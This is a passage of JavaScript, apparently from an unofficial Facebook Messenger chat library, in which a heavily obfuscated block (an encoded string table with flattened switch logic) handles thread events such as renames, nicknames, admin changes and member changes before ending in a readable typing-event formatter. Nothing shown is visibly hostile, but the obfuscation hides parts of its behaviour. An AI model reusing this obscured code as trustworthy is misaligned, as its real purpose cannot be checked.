B%5C%1A%01%0E%14%1D0G4%16/%0DG?%0D%3E%1FI+&-%02h.26%0EO%16%0B*%00%01%09OIQ5%1FL.:I@Q5%19:%5E:I:\'3%19L.%3C?:Q5%19:.J9%3C\'3mNN%0D%07%15Z;%10%22%19%5C%09Q%1C%07l%04A.%0ELREeL.%3CKM;%19%09%0B%5CZ%0E%04%0EN3%15=%0D_8#$(%5C%03%00%10A#?%06%0DHIPWH%5C%7DSPQ%0DSJ%5EtTCHY%1A%16%0B0G4%0E\'%0BA%19,%0E%19%04J8+,.%5B%5DQ%0DWJ%5EvRDDTTOVvN%5C%1A%11%16%13%1A\'%0F%5D83#%10G?%04%14%12%07AR%5E+UERUSJCrP@PSH@7%15%25%1F%5CJWLVuQXQ%0DSJ%5CwQEHY%1A%19%01*%14%01A7-%0D%04y.26%0E:;%01%01%0D(Z75?%02y6%3C8%08I/:%01%0BYJ9:Q5%1FLTJ9%3C\'E%1FL.%3C?%3CQ5%19:.J9%3C\'5oF%5E:?%3C\'B3%15=%0DOIQE%1FL.%3C?:Q5%19:%5EIIJ!E%1F:(:I:\'3mJ%5E@I:\'GmL%20-%15%0BQ?%0D%3E%1FI75?%02h%10%07)%0EHA%196/%19%5CJ%16%08&(M0#0%0DSK\'S:%0DY%1C%18%1C!%06%1EZ%01%00%09%0BdOE%0ETQJ%5ErTPQ%1APJ%5Et%22%5C%5B;08%04y&%1A$%08%5D%19Z%0B%0BXII:!E%1F%3C%5E@9%3CQOo%3C(%3CI:Q5%19:(J9%3C\'5o%3C(%3C9J!3%19:%5C%5EJQ%15%5CtVFTTLLXvQDHXIJ%01vWCQQUWX%7CQETKZ%18%1C!%06%1EZ%01%00%09%0BdOE%19SQJ/tJE%0EPQJ%5CvW%5C%5B;08%04yOE%0ETQJ%5EsSPWWTO%5Dm%5C4%0E\'%0BQE%7F%05%07%04%03%0AA%0D%25%14%10AJQ%02%5CtW@YGQ%15%5CtWERWH@7%15%25%1F%5CJQ%02ZtWAXGQ%15%5CtWESRHA/+%22%1F%5CI:\'U&%15%10%00%09Z%07%139%04%1A%0F%11%15Z%19.%1D%1F%5C77%18%03l2!$%0EM;%19%09%0B%5CZ%14%00%08N%15%20%07%0B_IJ%01pWEPTQ_%5E%3CVEQPWSU3%0F%1C%0D%07I+)6%0DIIR%19K%5E%02%22CLR%0EH%5EsPEPKH%09%19-%13%16%09J0=%1C.N%0E%02%03%12%1FNlW%1ASSPK_tJE%19SPH%5CpNO0%25%13%10S3%0D%0F%0B%5C%5CQ5%1FL.:I:\'3o%3C%5E:?%3C\'E%1F:(:I:\'3%1FLTJ9%3C\'3%7BOE%0EPQH%5CrWXWTVKXm%5D%5DP%5BWM%5B%7DBE%0EPQJ%5EpQ%5CZ%00%13%1F%0F/%5C%16%00%11%04ZFrPFRTLJ%01vWFRTUST%15%20%07%0B_IJ%01rWESQT_XqRBWKZ%01;%10%22%19%5C3(#%04l2!$%0EMQ5%1FL.:I:\'3o%3C%5E:?%3C\'E%1F:(:I:\'3%1FLTJ9%3C\'3h%10%1F%1B%08HA%13&%15%10%00%09Z%07%1C!%13%00%13%0CA/:%01%0BN%1C%04%14%14%0D0%0E%1A%0FB%12%1F%1B.O%5C%1A%10%04%0E%1B6%09UI%11%141%00lN%5CJJ%0A%13%5D)O%5CH%1F%07%0F%00\'%13%1C%0E%0CA7,)%0D%5DH%19%13%1F%1A1%15%1BAJJ!5o%3C.JC:\'EeL.%3C?J!E%1F:(%3CI:\'3%1FL.%3C?:Q5%19:(HIIREo%3C%5E:?%3C!E%1F:(JJJQ5o%3C(%3C9J!3%19N%5CKJ%0E%08%0D+O%5CHK%1C%16%0B0G%1AX%0D%0BA%081%09%16%15%0B%0E%14N+%05%22%0BJH%01%1C!%13%00%13%0CAR\'%13%04%04IKHQF%15*G%0AJHS%13%22%12%1B%02%16%08%15%00d6%3C8%08I%11X%15%0DY,&5%10B#V9%0BK%1A%16%0B0G%3C%18-%0BGLf%5C%03%00%10A%199%03%0DHIR%0EH%5EtTCQOWOYqU%5CZ%19%0D%1F%1Ad%22%01+%08Z3Z/%14O%16%0A%08%16%0Bl%04%22&%08%5DRXrQAWOQ%15%5CtUEWSHS%157%10%1C%15%01%09R%0D%13%20%1FH%19%02%1B%1D!G%5DPQPK%5CvBE%0EPQJ%5EuP%5C%5B%016=%04yOCYWQLCt%08GQWTMYm%5C0%15(%0BQE%7F%05%07%04%03%0AA%0D%25%14%10AJWCVqQXQ%0DSK%5EvPAHX%02-).Z%5DSTSH%5CtBE%0EPQJ%5EuQ%5CZ%19%17%1B%1Cd%22%03%06%09%5CR%5E+UESWUNCrQMXQHA%19,%0E%19%04J$%0C%09/%5B%5DWZSOXiW%1ASRTKYrN%5C%12%15%08%0E%0D,O0%17%05%0AS%15\'%06%06%04BIJ%16uW0S\'LJ%01vWBQSTST%01%11%12%0A_IJ%01uWEQPTHKrR@VRHA%0C6%02%14%0AB(N%057%5C%16%00%11%04ZFt%08GQWRK%5EiW%0DPR%208_m%5D0%17%05%0AG+0-%1F__%0AL?.I%19%04%0C%06%0E%06%7BOE%0ETQJ%5EsPPWWTNXm%5D%5DQ%1APJWp$XQ%0DSJZpRGHY%03%08%0B%25%0CN%1C+%185%04oZ%1EW3%0B!+0-%1F%3CY%1C%18%1C!%06%1EZ%01%00%09%0BdOE%0ETQJ%5CtSPWWTM_m%5D%166%25%0BG+0-%1F%5D/%25.%04oO%12P.%0BGSy%12%1B%05%07%07%13%00!%03J%0AT0%10@(%02%1B%06%16%09@%09u+%1FH%5DIJ%01uWEQPPJKrR@WSH@Ft%08CQRSI%5BaW%0DPRQHVm%5C%17%13%07%00%11U\'%06%06%04BIJ%16uWE\'RLJ%01vWERQQST\'02%0B_IKWrPFPGQ%15%5CtWEURHA+0-%1F%5C/%25.%04%7F%05%07%04%03%0AA%139%1A%07%04%16%14%08%00d.%0C.%08Z%07%081%09%16%15%0B%0E%14N#T%1C%0AJH%01%1C!%13%00%13%0CA%1D%06v%09%5DHI4%20%08*O%5CJ%11%0C9%02lN%5E%02;%05%11FmL$.%18%0DRG9%01%00%0F%01%15%13%01*G4%10%00%0ARG?%15%10%15%17%13%14NlL%5E:I:\'3%1FL.%3C?JREo%3C%5E:?%3C!E%1F:(HOJ%5BE%1F:%5CJJIQF%1FL.:CJ!3oF%5E:?%3CQ5o%3C(%3C?%3CQ5%19N.J9:Q5%1FL.%3C?J!E%1F:(%3CI:\'3%1FL.%3C?:QOo%3C(%3C?%3CSDl%22\'V%12ISGm%1A%13%14%0C%02%0E%07+%09U%02;%05%11Fm%1C%07%04%16%14%08%00dO%06%12%06%0FRGm%3C%3C0%20%0ERG%19O0+8%0FRGm%1A%13%14%0C%02%0E%07+%09U%16%0EW%10Fm%1C%07%04%16%14%08%00d&%0C%0B%0FISE/%0C4%0FJHQ/%0D%3E%1AIKJ?4%22%14%5DHI05%14(O%5C%1C%04%14%14%0D0%0E%1A%0FB8)V.O%5C%1A%10%04%0E%1B6%09UI/5C%00lN%5CJ9%3C%07%02!%13U%12%05P%10S%1FE%3E%0FP,XBf%0A8V/CVL%04%02%12CNC/%0D6%15%1A%09%03CVL%25%04%07CNC,%1A\'%0C%1A%12%09CVL-1E,@MX%05\'%12%00%06%03%021%0D6%00%17%06%10%06XBf%15%1B%15%01%06%18#\'%18WM@%13%14%1A\'%00%17!%06.%18LhE%1C%13%0C%02%0E=1%04%01!%06.%18LhE%07%087%13%0E%01,%06WM@%0B%13%0Fx%15%1B%15%01%06%18E!%0E%1F%08%16CVL\'%0C%1C%0D%0DCVL6%09%16%0A%018%19%05-%0B%1ACNC%1F%07.%0E%01CNC%08%00\'%0C%168%07%08%10%070EYCD%0B%13%0Fx%15%1B%15%01%06%18E+%02%1C%09@MX%1C*%13%16%06%008%15%0B-%0FWM@%0B%13%0Fx%14%00%02%16J%12%01!%0A%1D%06%09%02XBf%0F%1A%04%0F%09%1D%05\'%12WM@%17%1D%1A6%08%10%0E%14%06%12%1C%1D%08%17CNC%12%01!%0A%1D%06%09%02XBf%0D%16%09%03%13%14LhE%06%14%01%155%06$%0EWM@%01%15%06&EYC%0D%03XBf%0F%12%0A%01CVL.%0E%14%5D%10%0F%0E%0D#%05%5E%06%00%0A%15%061EYC%25#1!%0C%3E61!)(LhE%12%03%008%1D%0C/%08%1DCNC%1D%0C/%08%1D.%20%14XBf%11%06%14%0CCVL%16%20!%20!3#!%06EYC%16%02%11%074%04,%06%00%0A%15%06fKW%01%0D%0B%08%0D0EYC%08%08%1BR6%09%01%02%05%03Q%092%11%01%08%12%06%10E/%0E%17%02@MX%092%11%01%08%12%06%10%25-%05%16CNC5%0B%18;8CNC%10%07%25%5B%07%0F%16%02%1D%0Co%0F%12%0A%01CVL6%09%01%02%05%032%09/%04WM@%0B%13%0Fx%12%06%05%17%04%0E%01%20%04WM@%06%18%0C\'%05#%06%16%13%15%0B+%11%12%09%10%14XBf%12%1C%0A%01CVL7%12%16%15%22%055%0CfKW%01%11%0B%10&#%0C%16CNC%1B%0D,%05%16%15@MX%18#%13%07%0E%07%0E%0C%09,%15:#%17CVL.%0E%14%5D%11%09%0F%1D%20%12%10%15%0D%05%19LhE%1F%02%02%13,%090%15%1A%04%0D%17%1D%066\'%11.%00C\'U%22%12%1B%02%16%08%15%00d2;R%08IS%156%02%01%14%10%0FZ%09(Q%1AIKJ%09/(%17%5DHI%20%11/-O%5CJ%09%02%09%02lN%5E0-%1B%16Fm%1A%13%14%0C%02%0E%07+%09U42%20%11Fm%1C%07%04%16%14%08%00dO03U%11RGmL.%3C%1F%07%0F%00\'%13%1C%0E%0CA%0D%00%00%0C%5DH%19%13%1F%1A1%15%1BAJ%15%03%1E!%08%13AJ:\'E%1F:%5CH9J%5BE%1F:%5E@I:\'39%01%00%0F%01%15%13%01*G$*%14%0ARG?%15%10%15%17%13%14Nl*=9%09ISG%1F.$#%0DIS3l6&%25%0FISG9%01%00%0F%01%15%13%01*G%06%08%1B%0ARG?%15%10%15%17%13%14NlF.%3CI:\'G%1FLTJ9%3CQOo%3C(JCJ!3%19%1A%13%14%0C%02%0E%07+%09U,$%10%11Fm%1C%07%04%16%14%08%00dO.%3C9:\'3o%3C(H9J!3oF%5E:?%3C%07;%0C%14%1CIKZ%1C%1B*%04%01%08%0D%0FZ%01%20%13%1EIK%1A%08%0B0%12%07%0FB%20=%1C+O%5C:%11$%0A%1FlN(Z%1F%07%0F%00\'%13%1C%0E%0CA3/(%0C%5DH%19%13%1F%1A1%15%1BAJ%201%184O%5CH9%02%09%0A7O%5C%3CJH%07%081%09%16%15%0B%0E%14N/_%1B%0AJH%01%1C!%13%00%13%0CA%0D%14%14%09%5DHI%16%00%3E*O%5CJ;6%19%02lN%5E,%1A%08%13FmL%203U%0ARGo%22;R%0DISE#%0FG%0FJHQ%09&%15%18IKJ;?r%16%5DHI8L%3C*O%5CJ%05%0DL%01lN%5E%06U%0C%16FmL%02+%17%10RGo%08%1D%19%0EISE3%091%0AJHQ%192+%18IKJ?%20w%08%5DHI%20;?)O%5CJ%01Q1%05lN%5E0T%0C%0BFmL%06%08%1B%0ARGo%0C%16%12%0EISE/%108%10JHQ#%02%16%1EIKJ%1DY)%0B%5DHI4O?+O%5CJ#%0A;%07lN%5E%16%0C%25%11FmL0)%11%0FRGo%22=%12%0CISE\'%04-%0FJHQ%1D%05%0B%05IKJ%09/(%17%5DHI(9=/O%5CJ%09%0A;%00lN%5E05)%14FmL%1E%16/%10RG9%01%00%0F%01%15%13%01*G8%19%0B%08RG?%15%10%15%17%13%14NlL.%3CKJ!39%01%00%0F%01%15%13%01*G%1AT%09%08RG?%15%10%15%17%13%14NlL%5DIJJ%5BE%1F:%5CJ9%3CSElOT@9%3CQ5%19N.JCJ!3oF%5E:?J%5BE%1F:(HIIQOo%3C(HIIQ5%19N%5EII:\'GoO%5E:?HSE%1F:%5C:I@Q5%19LTJ9%3CQOo%3C(JCJ!3oF%5E:?J%5BE%1F:%5E@I:\'39%01%00%0F%01%15%13%01*G%3C%12%06%08RG?%15%10%15%17%13%14N#%17%14%10JHQ/%15Q%04IKJ#%0Bt%17%5DHI$%20%087O%5CJ3.%00%02lN%08%07%17%0F%19%1A-%08%1BA%09Q%1C%07l%22%1BY%0AM%1D8%25%0E%5C%1A%0E%04%0EN%05%0EF%09_CXU2%06%07A%010O%06yOE%0EPQN%5DqWXQ%1APJV%00R%5CZ%19%0D%1F%1Ad%04&%22%0BZ%0D%06-%0B%10I%010O%06xOCYPRLCt%08GQWPOXmN%0E%12%15%08%0E%0D,O%160W%09S%15\'%06%06%04BILVuSCLR%0EH%5EqWGTK%5B%19?q%0FH%021%22%13PyL.:I:!Oo%3C(JCJ!3%19L.J9%3C\'3o%3C(%3C9J!3%19%3C%5E@I:\'3%19X%5DQ%0DWJ%5EuUGDTTO%5B%7DNOIR%0EH%5ErTAUOQ%02_t$6WKZ%18%1C!%06%1EZ%01%00%09%0BdOE%19VQJXqBE%0EPQJ%5EvQ%5C%5B%010O%06yOCWTPLCt%08GQPQNXm%5C%0E%20%0BR%12Ey%00#%00%0BZ%07%0C6%02%14%0AY%02%1B%1D!G%5DQ%0DSJ_tTALR%19K%5EvW4HX%02+%5B,Z%5DQ%0DSJ%5BtQGLR%19K%5E%05V@HY%02)--JXZ%00%13%1F%0F/%5C%16%00%11%04ZFt%1FGQRU8Kt%08GQRQIZm%5D%160W%09GFrQAQTLJ%01vWDTSPSU\'46%08_$%14V,J%5DJ9:Q5%1FLTJ9%3C\'E%1FL.%3C?%3CQ5%19:.J9%3C\'5o%3C(%3C?HA%0C6%02%14%0AY%1C%07%136%02%01%14%10%0FZ/-T%1DZ%1F4M%004O%5CZ%04%14%14%0D0%0E%1A%0FB$%0A(-O%5C%1A%10%04%0E%1B6%09UIJJ!O%1F:(HI:\'G%1FLTJ9%3C\'%13%22%12%1B%02%16%08%15%00d%3E8%19%0BIS%156%02%01%14%10%0FZFlLTJ9%3CQOo%3C(HHI;#v%17%5DHKHQFo%3C.J9:QOo%3C(%3CI:Q5%19:(J9%3C\'5o%3C(%3C9J%5BE%1F:(%3CK%1C%1C%1B*%04%01%08%0D%0FZ//&%1CIK%1A%08%0B0%12%07%0FBI%0E%174%02%1A%07BI!3o%3C(HK:QOo%3C(JCJ!3oF%5E:?%3C%07%081%09%16%15%0B%0E%14N%11/%06%08JH%01%3C%7D%05%01%039%16%3E:+O%5C%3C_%20=%1C+O%5C:;U%11%00lN(Z#&%08%01lN.$.%16%15FmL%16%00%13%0FRG%19Z\'X%00%15%185+%173%0FJH\'U9%01%00%0F%01%15%13%01*G%02%07%14%08RG?%15%10%15%17%13%14N3%119%0CJHQ%19*#%1EIKJ?4%22%14%5DHI,*%5B)O%5CJ#.%00%1FlN%5E%0A%09%20%14FmL0%11$%08RGo%10%1B%25%09ISE%0D,E%0CJHQ/%0B%1D%04IKJ?4%22%14%5DHI%201%184O%5CJ%0D%09%02%02lN%08%07%17%0F%19%1A-%08%1BA3%22%14%07lN%0E%13%07%15%0F%1C*G%5D$0V%0AFmN%5EI\'3M%1ElN%5C%1C%04%14%14%0D0%0E%1A%0FB%12%1B%1F-O%5C%1A%10%04%0E%1B6%09U%20%1B%0B%17FmL%1A%09%1A%0DRGo.%3EQ%0FISE%09!%04%0AJHQ+%00%08%18IKJ%1DY)%0B%5DHI%0A%11/*O%5C%1C34%1B%00lNN%07%17%0F%19%1A-%08%1BA%11%02%22%07lN%0E%13%07%15%0F%1C*G%16%02:%0FRGo2%17%12%13ISE%05,%03%11JHQ%05\'%14%19IKJ+!%3E%0B%5DH%1F%07%0F%00\'%13%1C%0E%0CA/$%1E%0E%5DH%19%13%1F%1A1%15%1BA%15%1B*%00lN%5E%0E%0A%19%16FmL$.%18%0DRGo6%3E%17%09ISE%05%0C4%08JHQ%09s%0A%19IK%1C%1C%1B*%04%01%08%0D%0FZ%01s5%1CIK%1A%08%0B0%12%07%0FB%20%03%04)O%5CJ%09%02%09%02lN%5E48%07%14FmL%168%06%0ARGo6:%1B%0EISE#%0FG%0FJHQ;%1E%01%1BIKJ%09%03%07%0B%5DHI%02#%0A/O%5CJ3.%00%02lN%083%5B%03%0E%0Cj*%19Y.%5C%1C%1B*%04%01%08%0D%0FRG?%15%10%15%17%13%14NwT%08Z0X%18%1A&I%1A5%03,G%081%09%16%15%0B%0E%14Fm%1C%07%04%16%14%08%00dUM%1CY3C%0C0%05%5B(%05R6S%22%12%1B%02%16%08%15%00lN%0E%13%07%15%0F%1C*GDQ%1FZ(W&%13%17O%09.O%22y%01%00%0F%01%15%13%01*O%5C%1A%10%04%0E%1B6%09UPU%1CA%3C%7D%05%01%03L$%187%08Z%13%14%0C%02%0E%07+%09%5DH%19%13%1F%1A1%15%1BAQU%07U%16%5E%17%15%00O%1D$t+H%07%17%0F%19%1A-%08%1BIK%1A%08%0B0%12%07%0FBRO%13%7F5L%03%16%03T%0D%0119%5C%04%14%14%0D0%0E%1A%0FJH%01%1C!%13%00%13%0CAH%5C9%5C\'X%00%15%18@%01T%25+_%07%0F%00\'%13%1C%0E%0CIS%156%02%01%14%10%0FZ%5Dt%1AN3%5B%03%0E%0Cj%0072(%5C%1C%1B*%04%01%08%0D%0FRG?%15%10%15%17%13%14NwQ%08Z0X%18%1A&I%16%16,+G%081%09%16%15%0B%0E%14Fm%1C%07%04%16%14%08%00dUF%1CY3C%0C0%05%5B8%13(0S%22%12%1B%02%16%08%15%00lN%0E%13%07%15%0F%1C*GDY%1FZ(W&%13%17O%11.;$y%01%00%0F%01%15%13%01*O%5C%1A%10%04%0E%1B6%09UPW%1CA%3C%7D%05%01%03L4%16*%0EZ%13%14%0C%02%0E%07+%09%5DH%19%13%1F%1A1%15%1BAPW%07U%16%5E%17%15%00O/%00%25,H%07%17%0F%19%1A-%08%1BIK%1A%08%0B0%12%07%0FBSM%13%7F5L%03%16%03T%1D%15P?%5C%04%14%14%0D0%0E%1A%0FJH%01%1C!%13%00%13%0CAH%5E9%5C\'X%00%15%18@%09%03E+_%07%0F%00\'%13%1C%0E%0CIS%156%02%01%14%10%0FZ%5Ds%1AN3%5B%03%0E%0Cj%089S(%5C%1C%1B*%04%01%08%0D%0FRG?%15%10%15%17%13%14Nw_%08Z0X%18%1A&I%1E&:+G%081%09%16%15%0B%0E%14Fm%1C%07%04%16%14%08%00d%5E%08Z0X%18%1A&I%1E(%17*G%081%09%16%15%0B%0E%14Fm%1C%07%04%16%14%08%00dU@%1CY3C%0C0%05%5B,%04%191S%22%12%1B%02%16%08%15%00lN%0E%13%07%15%0F%1C*GDW%1FZ(W&%13%17O%05%25%0A%25y%01%00%0F%01%15%13%01*O%5C%1A%10%04%0E%1B6%09URS%1CA%3C%7D%05%01%03L(%1B%1D%0FZ%13%14%0C%02%0E%07+%09%5DH%19%13%1F%1A1%15%1BAQS%07U%16%5E%17%15%00O?%5B),H%07%17%0F%19%1A-%08%1BIK%1A%08%0B0%12%07%0FBSK%13%7F5L%03%16%03T/t%0F%3E%5C%04%14%14%0D0%0E%1A%0FJH%01%1C!%13%00%13%0CAHZ9%5C\'X%00%15%18@%1D%128*_%07%0F%00\'%13%1C%0E%0CIS%156%02%01%14%10%0FZ_%7D%1AN3%5B%03%0E%0Cj%14&$)%5C%1C%1B*%04%01%08%0D%0FRG?%15%10%15%17%13%14Nv%5E%08Z0X%18%1A&I%20%11**G%081%09%16%15%0B%0E%14Fm%1C%07%04%16%14%08%00dVF%1C%1FH\")")
}();
var QEUi = R9btb[R9btb.lhOob(0)]();
while (QEUi < R9btb[R9btb.JJLob(1)]()) switch (QEUi) {
    case (0x75bcd15 - 0O726746425):
        QEUi = global[R9btb.Z1yob(2)][R9btb.Z35ob(3)][R9btb.RTVob(4)](R9btb.JLipb(5)) ? R9btb[R9btb.FGdpb(6)]() : R9btb[R9btb.JJLob(1)]();
        break;
    case (0O57060516 - 0xbc614d):
        QEUi = R9btb[R9btb.JJLob(1)](); {
            switch (hasData(formatID((m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.JJLob(9)] || m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.Z1yob(10)])[R9btb.Z35ob(11)]()))) {
                case !![]: {
                    switch (logMessageType) {
                        case R9btb.RTVob(12): {
                            let k2Mi = getData(formatID((m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.JJLob(9)] || m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.Z1yob(10)])[R9btb.Z35ob(11)]()));
                            k2Mi[R9btb.JLipb(13)] = (logMessageData[R9btb.FGdpb(14)] || k2Mi[R9btb.JLipb(13)]);
                            k2Mi[R9btb.h67mb(15)] = (logMessageData[R9btb.lhOob(16)] || k2Mi[R9btb.h67mb(15)]);
                            updateData(formatID((m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.JJLob(9)] || m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.Z1yob(10)])[R9btb.Z35ob(11)]()), k2Mi);
                        }
                        break;
                        case R9btb.JJLob(17): {
                            let MzPi = getData(formatID((m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.JJLob(9)] || m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.Z1yob(10)])[R9btb.Z35ob(11)]()));
                            MzPi[R9btb.JLipb(13)] = (logMessageData[R9btb.Z1yob(18)] || MzPi[R9btb.JLipb(13)]);
                            updateData(formatID((m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.JJLob(9)] || m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.Z1yob(10)])[R9btb.Z35ob(11)]()), MzPi);
                        }
                        break;
                        case R9btb.Z35ob(19): {
                            let gXHi = getData(formatID((m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.JJLob(9)] || m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.Z1yob(10)])[R9btb.Z35ob(11)]()));
                            gXHi[R9btb.RTVob(20)][logMessageData[R9btb.JLipb(21)]] = (logMessageData[R9btb.FGdpb(22)][R9btb.h67mb(23)] == (0x75bcd15 - 0O726746425) ? gXHi[R9btb.lhOob(24)][R9btb.JJLob(25)](IuKi => IuKi[R9btb.Z1yob(26)] == String(logMessageData[R9btb.JLipb(21)]))[R9btb.Z35ob(27)] : logMessageData[R9btb.FGdpb(22)]);
                            updateData(formatID((m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.JJLob(9)] || m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.Z1yob(10)])[R9btb.Z35ob(11)]()), gXHi);
                        }
                        break;
                        case R9btb.RTVob(28): {
                            let Iwhj = getData(formatID((m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.JJLob(9)] || m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.Z1yob(10)])[R9btb.Z35ob(11)]()));
                            switch (logMessageData[R9btb.JLipb(29)]) {
                                case R9btb.FGdpb(30): {
                                    Iwhj[R9btb.h67mb(31)][R9btb.lhOob(32)]({
                                        [R9btb.Z1yob(26)]: logMessageData[R9btb.JJLob(33)]
                                    });
                                }
                                break;
                                case R9btb.Z1yob(34): {
                                    Iwhj[R9btb.h67mb(31)] = Iwhj[R9btb.h67mb(31)][R9btb.Z35ob(35)](k4jj => k4jj[R9btb.Z1yob(26)] != logMessageData[R9btb.JJLob(33)]);
                                }
                                break;
                            }
                            updateData(formatID((m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.JJLob(9)] || m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.Z1yob(10)])[R9btb.Z35ob(11)]()), Iwhj);
                        }
                        break;
                        case R9btb.RTVob(36): {
                            let Ercj = getData(formatID((m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.JJLob(9)] || m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.Z1yob(10)])[R9btb.Z35ob(11)]()));
                            var gZej = R9btb[R9btb.lhOob(0)]();
                            while (gZej < R9btb[R9btb.JJLob(1)]()) switch (gZej) {
                                case (0x75bcd15 - 0O726746425):
                                    gZej = Ercj[R9btb.JLipb(37)] == !![] ? R9btb[R9btb.FGdpb(6)]() : R9btb[R9btb.FGdpb(38)]();
                                    break;
                                case (0O57060516 - 0xbc614d):
                                    gZej = R9btb[R9btb.JJLob(1)](); {
                                        Ercj[R9btb.JLipb(37)] = (NaN === NaN);
                                    }
                                    break;
                                case (15658734 ^ 0O73567354):
                                    gZej = R9btb[R9btb.JJLob(1)](); {
                                        Ercj[R9btb.JLipb(37)] = !![];
                                    }
                                    break;
                            }
                            updateData(formatID((m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.JJLob(9)] || m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.Z1yob(10)])[R9btb.Z35ob(11)]()), Ercj);
                        }
                        break;
                        case R9btb.h67mb(39): {
                            let Am7i = getData(formatID((m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.JJLob(9)] || m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.Z1yob(10)])[R9btb.Z35ob(11)]()));
                            Am7i[R9btb.lhOob(40)] = (logMessageData[R9btb.Z35ob(27)] || formatID((m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.JJLob(9)] || m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.Z1yob(10)])[R9btb.Z35ob(11)]()));
                            updateData(formatID((m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.JJLob(9)] || m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.Z1yob(10)])[R9btb.Z35ob(11)]()), Am7i);
                        }
                        break;
                        case R9btb.JJLob(41): {
                            let cU9i = getData(formatID((m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.JJLob(9)] || m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.Z1yob(10)])[R9btb.Z35ob(11)]()));
                            csds: for (let wh2i of logMessageData[R9btb.Z1yob(42)]) {
                                var YO4i = R9btb[R9btb.lhOob(0)]();
                                while (YO4i < R9btb[R9btb.JJLob(1)]()) switch (YO4i) {
                                    case (0x75bcd15 - 0O726746425):
                                        YO4i = cU9i[R9btb.lhOob(24)][R9btb.Z35ob(43)](AeZg => AeZg[R9btb.Z1yob(26)] == wh2i[R9btb.RTVob(44)]) ? R9btb[R9btb.FGdpb(6)]() : R9btb[R9btb.FGdpb(38)]();
                                        break;
                                    case (0O57060516 - 0xbc614d):
                                        YO4i = R9btb[R9btb.JJLob(1)]();
                                        continue csds;
                                    case (15658734 ^ 0O73567354):
                                        YO4i = R9btb[R9btb.JJLob(1)](); {
                                            cU9i[R9btb.lhOob(24)][R9btb.lhOob(32)]({
                                                [R9btb.Z1yob(26)]: wh2i[R9btb.RTVob(44)],
                                                [R9btb.Z35ob(27)]: wh2i[R9btb.JLipb(45)],
                                                [R9btb.FGdpb(46)]: getGenderByPhysicalMethod(wh2i[R9btb.JLipb(45)])
                                            });
                                            cU9i[R9btb.h67mb(47)][R9btb.lhOob(32)](wh2i[R9btb.RTVob(44)]);
                                        }
                                        break;
                                }
                            }
                            updateData(formatID((m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.JJLob(9)] || m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.Z1yob(10)])[R9btb.Z35ob(11)]()), cU9i);
                        }
                        break;
                        case R9btb.lhOob(48): {
                            let cM1g = getData(formatID((m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.JJLob(9)] || m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.Z1yob(10)])[R9btb.Z35ob(11)]()));
                            cM1g[R9btb.h67mb(47)] = cM1g[R9btb.h67mb(47)][R9btb.Z35ob(35)](w9Tg => w9Tg != logMessageData[R9btb.JJLob(49)]);
                            cM1g[R9btb.lhOob(24)] = cM1g[R9btb.lhOob(24)][R9btb.Z35ob(35)](YGWg => YGWg[R9btb.Z1yob(26)] != logMessageData[R9btb.JJLob(49)]);
                            var s4Og = R9btb[R9btb.lhOob(0)]();
                            while (s4Og < R9btb[R9btb.JJLob(1)]()) switch (s4Og) {
                                case (0x75bcd15 - 0O726746425):
                                    s4Og = cM1g[R9btb.h67mb(31)][R9btb.Z35ob(43)](UBRg => UBRg[R9btb.Z1yob(26)] == logMessageData[R9btb.JJLob(49)]) ? R9btb[R9btb.FGdpb(6)]() : R9btb[R9btb.JJLob(1)]();
                                    break;
                                case (0O57060516 - 0xbc614d):
                                    s4Og = R9btb[R9btb.JJLob(1)](); {
                                        cM1g[R9btb.h67mb(31)] = cM1g[R9btb.h67mb(31)][R9btb.Z35ob(35)](oZJg => oZJg[R9btb.Z1yob(26)] != logMessageData[R9btb.JJLob(49)]);
                                    }
                                    break;
                            }
                            updateData(formatID((m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.JJLob(9)] || m[R9btb.h67mb(7)][R9btb.lhOob(8)][R9btb.Z1yob(10)])[R9btb.Z35ob(11)]()), cM1g);
                        }
                        break;
                    }
                }
            }
        }
        break;
}
return {
    type: "event",
    threadID: formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),
    logMessageType: logMessageType,
    logMessageData: logMessageData,
    logMessageBody: m.messageMetadata.adminText,
    author: m.messageMetadata.actorFbId,
    participantIDs: m.participants || []
    };  
}

function formatTyp(event) {
  return {
      isTyping: !!event.st,
      from: event.from.toString(),
      threadID: formatID((event.to || event.thread_fbid || event.from).toString()),
      // When receiving typ indication from mobile, `from_mobile` isn't set.
      // If it is, we just use that value.
      fromMobile: event.hasOwnProperty("from_mobile") ? event.from_mobile : true,
      userID: (event.realtime_viewer_fbid || event.from).toString(),
      type: "typ"
  };
}

